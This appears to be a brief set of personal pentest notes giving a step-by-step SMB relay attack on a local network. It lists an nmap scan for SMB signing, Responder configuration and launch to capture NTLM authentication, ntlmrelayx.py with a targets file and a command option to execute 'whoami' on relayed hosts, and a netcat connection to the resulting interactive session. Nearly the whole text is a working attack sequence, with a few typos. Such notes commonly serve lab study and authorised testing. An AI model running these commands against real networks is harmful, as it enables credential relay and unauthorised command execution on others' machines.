# SMB Relay Attack

## Scan for vulnerablity

```bash
nmap --script=smb2-security-mode.nse -p445 192.168.70.141 -Pn
```
- -p445 = Port 445
- -Pn = Treat Hosts as active
- --script=... = execute script

## Preparation

- edit /etc/responder/responder.conf (configuration File)
```bash
mouespad etc/responder/responder.conf
```

```bash
SMB = Off
HTTP = Off
```

- Create targets file

```bash
gedit targets.txt
 192.168.70.136
 192.168.70.138
```

## Usage

### Start repsonder

```bash
responder -I eth0 -dwPv
```

### Start NTLM Relay

```bash
ntlmrelayx.py -tf targets.txt -smb2support (-i -c "whoami")
```
- -tf = targetsfile
- -i = Interactive mode(listen on given port/IP with netcat)
- -c = command

```bash
nc 127.0.0.1 11000
```

